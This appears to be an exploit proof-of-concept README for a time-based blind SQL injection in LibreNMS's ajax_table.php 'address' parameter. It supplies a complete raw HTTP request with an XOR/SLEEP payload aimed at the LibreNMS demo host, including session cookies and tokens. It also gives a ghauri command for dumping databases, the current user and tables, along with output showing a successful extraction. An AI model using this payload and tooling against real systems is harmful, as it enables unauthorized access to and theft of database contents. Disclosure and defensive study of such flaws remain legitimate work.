# librenms_sql_poc

Exploit Title: librenms SQL Injection Leads to database extraction

Exploit Author: Nisha Thakur

Vendor: librenms

Vendor Homepage: https://www.librenms.org/

Impact: Database Extraction

LinkedIn: https://www.linkedin.com/in/nisha-thakur-32b162277/

## POC
Login your account. then copy the cookie and paste on below raw request
```
POST /ajax_table.php HTTP/1.1
Host: demo.librenms.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 221
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: laravel_session=eyJpdiI6IkhSbUwrVXQ0dHJDekVadlBrZStpWFE9PSIsInZhbHVlIjoicGZpL24yVGs5V1BxTnVWZXBGTmVrWUdKY0gyNmJJWHhtb1BkR2k0REhpaXFnYkJ6YnF2YmpLSC8wWnZRSkhCeWVhRDY2WHZBREhxRFE0SGpDNUd2NTMzbXdCc09tMUZnaDlpZkxQeHpibzJnZVdUNVhMd3pvVndLaGhIWjNWK1AiLCJtYWMiOiJiNmVhOWU1ZDJiYWI1Yjk5NjA0ZDk0NWZiNzcyMTY2NmQ5ZGY4MmYxZGVlMDQ4NTNlNzkzMGMyN2RmMTUyYmZkIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IkxIZ3gvUGxDb0ZGNnEyUU9VNXdFYnc9PSIsInZhbHVlIjoibmI1alBXOVd1d1J6R3NCcUt1bkJNWGY0UzAxbFZYbVBKZG4rK0VRNkdpTVhwRzVqZXdGVmczMytnYjg5QVJmZ2FHZTNBa2RUY09MSFBDUWt1WXhQSEpiZDNVM3ZkUGVqbnJMVjZ6c2xjSEl5WkFNN0VWTWNUTXp3ZDZ2N1lWbnoiLCJtYWMiOiJhOGU4NDJiYTBmZTJiMTM2ZGNlZDMwNzkzMWM3NDVlZjEyYWFiODUwM2Q2ZmQ4YmVlMzUwOGM0ZDVkMmM3YjRiIiwidGFnIjoiIn0%3D
Origin: https://demo.librenms.org
Referer: https://demo.librenms.org/search/search=mac/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Csrf-Token: pqiGN72KyLqHwTyBgwtU6WVk216yTkC3TncjuZmX
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: demo.librenms.org
X-Forwarded-Proto: https
X-Forwarded-Url: https://demo.librenms.org/ajax_table.php
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

address='XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z&current=1&device_id=&id=address-search&interface=&rowCount=50&searchPhrase=&search_type=mac&sort[hostname]=asc
```
here vulnerable parameter is address .
For exploitation download ghauri tool. save raw request and then 
```
ghauri -r aa.txt --batch --dbs --current-user --hostname --tables
```
Response
```
Parameter: address (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind (query SLEEP)
    Payload: address='XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z&current=1&device_id=&id=address-search&interface=&rowCount=50&searchPhrase=&search_type=mac&sort[hostname]=asc

[16:54:29] [INFO] testing MySQL
[16:54:29] [INFO] confirming MySQL
[16:54:29] [INFO] the back-end DBMS is MySQL
[16:54:29] [INFO] fetching current user
[16:54:41] [INFO] resumed: 'librenms@localhost'
current user: 'librenms@localhost'
[16:54:41] [INFO] fetching hostname
[16:54:51] [INFO] resumed: 'utils'
hostname: 'utils'
[16:54:51] [INFO] fetching database names
[16:54:51] [INFO] fetching number of databases
[16:54:59] [WARNING] it was not possible to extract query output length for the SQL query provided.
[16:54:59] [WARNING] the SQL query provided does not return any output
[16:54:59] [ERROR] unable to retrieve the number of databases
[16:54:59] [INFO] fetching current database
[16:55:09] [INFO] resumed: 'librenms'
current database: 'librenms'
```
